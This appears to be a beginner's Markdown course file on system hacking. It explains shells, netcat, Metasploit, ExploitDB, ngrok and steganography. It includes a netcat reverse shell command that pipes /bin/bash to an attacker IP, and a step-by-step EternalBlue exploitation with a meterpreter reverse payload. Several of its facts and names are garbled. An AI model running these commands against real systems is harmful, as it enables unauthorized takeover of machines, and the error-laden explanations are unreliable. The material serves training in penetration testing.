## What is System Hacking?
- *System hacking is defined as the compromise between computer systems and software to access the target computer and steal or misuse their sensitive information.*
- The malware and the attacker identify and exploit the vulnerability of the computer system to gain unauthorized access.
- Here the malicious hacker exploits the weaknesses in a computer system to gain unauthorized access to its data or take illegal advantage.


## Linux System Hacking
- GNU/Linux is an Operating System (OS) assembled user the model of open-source software development and distribution and is based on Unix OS created by Linus Torvalds.
- Now to hack a Linux-based computer system and get access to a password protected Linux system, we have to know Linux's basic file structure.
- As we know, Linux is considered to be the most secure OS to be hacked or cracked, but in the world of Hacking, nothing is 100% secured.
- Hackers usually use the following techniques to hack the linux system.
- Hack Linux using the SHADOW file.
- Another technique commonly used by hackers is to bypass the user password option in Linux.(Privilege Escalation)


## Windows Pentest
- **Windows is wider, most famous os inter world it orgamnized by Microsoft coopration.**
- You have to learn Powershell Scripting and usage.
- Managing Services, Users, and  Active Directory system.

## Shell
- A shell is a program that interprets our commands and gives the written commands to the Kernel.
- Based on the Access to the shell while Pentest, it is Classified into: this are:-
1. Bind Shell
2. Reverse Shell
## 1.Blind shell
- A bind shell is a sort of setup where remote c![finding](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/62944980-7812-4f87-9f6e-428244f08a22)
onsoles are established with other computers over the network.
- **In Bind shell, an attacker launches a service on the target computer, to which the attacker can connect.**
- In a bind shell, an attacker can connect to the target computer and execute commands on the target computer.
- To launch a bind shell, the attacker must have the IP address of the victim to access the target computer.

## 2.Reverse shell
- As we saw shells are The only way to interact with the kernel.
- A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system's vulnerabilities to initiate a shell session and then access the victim's computer.
- Reverse shells allow attackers to open ports to the target machines, forcing communication and enabling a complete takeover of the target machine.
- Therefore it is a severe security threat.
- This method is also commonly used in penetration tests.

- On reverse shells, the attacker will listen for any request on specific port, and the victim will start the request on that port, so we will have a shell., the victim may not sending the request intentionally.
- But if the attacker send him a link/malware /malicious porgram/ that can start the reverse request that can leads to reverse shell.
- meany hackers use netcat tool .
- so what is netcat ?

## Netcat
- **Netcat is a Command-line Interface (CLI) Based tool that is use to read/write data over TCP/UDP.**
- It is a Back-End tool which can smoothly be cross utilized by other programs
- Used to Create a connection with any port you want or to create a listener on any port.
- It is a tool That helps to create Reverse shells or Bind shells
- It is built in on kali and parrot but for windows you have to download it.
#### Do not worry i gona show you how can get revesr shell on kali/parrot/ubuntu !! ok lets start.
- we must have netcat on both computer 



### A is on server  side / attacker
- Run this comand in terminal on lunix distro   to listen
-          sudo nc -lvpn "port" -s "your in "
-          Exmaple: sudo nc -lvpn 87 -s 192.160.0.0
- on Attacker computer now listening 
(https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/90d40f21-0a34-44b4-9d4c-893b9e2e4e9e)

### B is on client/victem side

- it allow their request  run this command
-          sudo nc -e /bin/bash "attackerip' "port"
- N.b when entering port on victem side equal to attacker listning port
-        Example: sudo nc -e /bin/bash 192.160.0.0 87  
- when you Enter the attacker gain reverse shell


 ##  Web servers![attaker]

- On the hardware side, a web server is a computer that stores web server software and a website's component files (for example, HTML documents, images, CSS stylesheets, and JavaScript files).
- A web server connects to the Internet and supports physical data interchange with other devices connected to the web.
- It is A computer software and hardware that uses HTTP and HTTPS to provide a website.
- There are a lot of softwares that can be installed on the server to work like web server

## A. Apache server
- This Server software will help to provide Web contents.
- On linux it comes Built in
- But on windows you can install it with softwares called Xampp and Wampp and will give you localhost web contents.
- if do not on kali Lunix you can install by typing this command ``sudo apt install apache2``
- To Start this server software use this command  `` sudo systemctl start apache2``
- #### Web Server - apache
- It only Browse their own directory go to  /var/www/html type this `` cd /var/www/html ``
- The website you see on the right side is the default web for apache2 the file for this is the “index.html”
- From now on our computer is acting like a webserver, it by default port 80 
- To view appche server  go to your browser and search your ip with : port, Example: ``192.160.0.0:80``
- To stop your apache go to your terminal and type ``sudo systemctl stop apache2``
## B. Python Server
- We can you python to start web servers
- To start the service ``python3 -m http.server port Number`` Example: `` python3 -m server.http 9090`` 
- To get accsse goto your browser search your ip aderss with : prot number Example ``192.160.0.0:9090
- It host it run path like /Desktop  /Download  it display only it path file :
- The python will help you to host website from any path on your computer with any port you need.
- Refer about   Ngnix, ruby web servers .


##  CVE
- CVE stands for Common Vulnerabilities and Exposures.
- CVE is a glossary that classifies vulnerabilities.
- The glossary analyzes vulnerabilities and then uses the Common Vulnerability Scoring System (CVSS) to evaluate the threat level of a vulnerability.
- The CVE glossary is a project dedicated to tracking and cataloging vulnerabilities in consumer software and hardware.
- If some one exploit the system the first time  it have higher risk it rigister in     **ZERO DAY*
-  It is maintained by the MITRE Corporation with funding from the US Division of Homeland Security.
- Vulnerabilities are collected and cataloged using the Security Content Automation Protocol (SCAP).
- SCAP evaluates vulnerability information and assigns each vulnerability a unique identifier.
- CVE-YEAR-ID
- CVE-2019-22321
## ExploitDB
- The Exploit Database is maintained by OffSec
- The Exploit Database is a CVE
- compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers.
- To get exloit use this website [Exploit] [https://exploit-db.com]
- And you can downlad it from github 
- There is A linux tool called “SearchSploit” That used to search from exploitDB server,and get the exploit.
### Caution
- But you have to be sure of the false positives
- That means if you have skill and knowladge you scan some network but you get 2 vernurablity but one skriptkiddey says it have 10 varnurablity this is FALSE POSTIVE 







##  Metasploit
- The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers.
- Because it’s an open-source framework, it can be easily customized and used with most operating systems.
- It is written with ruby.
- It have a lot of exploits for different kind of vulnerabilities and CVE’s
- It Provides you
- **Exploits:** *vulnerabilities or weaknesses that can be leveraged to gain unauthorized access, control, or manipulate a computer system.*
- **Payloads:** *a program that helps to run after exploiting/getting reverse-shells*
- **Auxiliaries:** *Programs That will help to scan further on the system.*
- Encoders,
- **Listeners:** *Listeners are commonly used in network services, servers, and communication protocols*
- **Post-exploitation codes:** **Used to run after we Exploit / privilege Escalation Start.**
- ON kali/parrot it is already installed,
- To install it uing this commnnd ```sudo apt install metasploit```
- To start it just type, ``msfconsole``  or if you went to skip the banner you can type this caommand ```msfconsole -q```
#### After starting Metasploit 
- We can search any exploit for a system.
- Example: for apache  ``search apache``
- **Create a Payload for windows  We will use metasploits Feature called msfvenom to create a payload.**
- if you went to use some expoit or auxilary tpe or assigned number or thier name ``use <your number>``

## Problem.
- Metasploit is a very old tool and even the encoders are very old.
- This means almost every users tried them and exploited for some time but now a days all the antivirus and Microsoft defender will stop them and detect them.
- But it is Still handy tool for other exploitation and Scanning, you will see it in the future use.
- If you want to test these encoders on your system(may be if it is vulnerable for some of them.)
- Just add -e and the encoder name from the list and create the payload.(msfvenom)
  
### lets exploit Enternal Blue on Metasploit  do not worry this is the Eduacatinal perpouse only !!🔥🔥

### What is Eternal blue ?
- It is developed by the USA National Security agency .
- It is exploiting the vulnerability of Microsoft Windows ,and it has high risk on users .
- It is a vulnerability /wake of Microsoft Windows,hackers can exploit computers using different programs.
### Which vulnerability is exploited by this exploit?
- It is specifically targeted for the vulnerability of Microsoft Windows operating system .
- It is Known as CVE-2017 
### How does it work?
- It works in SMB(server message Blocker) used server computer to other computer and server toyour computer like printer,server and others in remote access .
- If you connect your computer to the printer, when you print your document your computer uses SMB protocol to send a request to a printer.
- There are many SMB protocols like SMBV1(server message blocker version one ), SMBV2(server message blocker version two) and SMBV3.
- SMB1(It is mainly a vulnerability in Microsoft Windows operating system because many computers are affected by this ,because hackers use it for malicious purposes )- - SMB3 is more secure than SMB1 and SMB3.
### How hackers gain access?

- **Do not worry, I'm gonna show how hackers attack computers for Educational purposes only. ok lets start!!🔥🔥**
- ### A)  Information Gathering
- Before we start we must gather information about the system. 
- We should know about their OS system.(os detection) use nmap
- “sudo nmap -A <victim>” Example: ``sudo namp -A 192.160.0.0``
- ### B) Starting Metasploit
- In your terminal do not have metasploit you must install it especially on ubuntu ``sudo apt install metasploit -y``
-  after install start it in this command ``msfconsole -q``
- Type this command to search enteral blue exploitation
1) ``search exploit window/smb/window/sumb`` and you will see list and find enternal blue 
2) Type this to use ``use window exploit/sub/window/sumb/ms17_010_enternal_blue`` or select it containing number and type ``use 19`` or type 19 containing characters.
3) And insert victim ip set RHOST <VIctim ip> Example: ``set RHOS 192.168.0.0``
4) insert Attacker ip E.g set LHOST <your ip> used for listen for victim Example: ``set LHOST 10.0.2.0``
5) After that set payloads we get a reverse meterpreter shell to access the victim computer to enable us to use this command .
- And type this ``set payload windows/x64/meterpreter/reverse_http``
- *Payloads are:-a malicious software programed to execute targeted system*
6) Check your listener if they exist, run it, otherwise you write commands 3 and 4 steps again. ``Show options`` use this command.
7) Run/Exploit use this command ``run or exploit `` then you willget reves shell in meterpreter BOOM!!!🔥🔥🔥🔥
- For more check my video my (vide0)[https://www.kapwing.com/videos/65639fbe9f5842a9e206eff0]








●
## Ngrok
- Ngrok is one of the port forwarding tools.
- You can host websites with it
- You can listen to tcp connections
- To setup:
- GOTO their website & create account
- (Ngk) [https://ngrok.com/]
- Verify the ngrok through the email

- Download the ngrok
- Goto the download location
- Extract it
- Add ngrok to the /usr/bin
- Copy the Auth-token
- And run it on your terminal
- Starting ngrok
- There are 2 modes.
1. TCP -> ngrok tcp <PORT>
2. HTTP -> ngrok http <PORT>
- It gives some informations on its own dashboard
- It have GUI too Hosting our website

## Prevention
- Payloads are one of Malwares, so the prevention methods are same with Malware prevention methods.
- REMEMBER if you have strong antivirus software you are 80% safe.
- The every thing is not safe because of *humanbig misconfig /weak link*
## StegnoGraphy.
- Steganography is the practice of hiding a secret message inside of (or even on top of) something that is not secret.
- That something can be just about anything you want.
- These days, many examples of steganography involve embedding a secret piece of text inside of a picture
- But also we can hide inside audio files and etc
- There are many tools for this.
- The famous on is “steghid
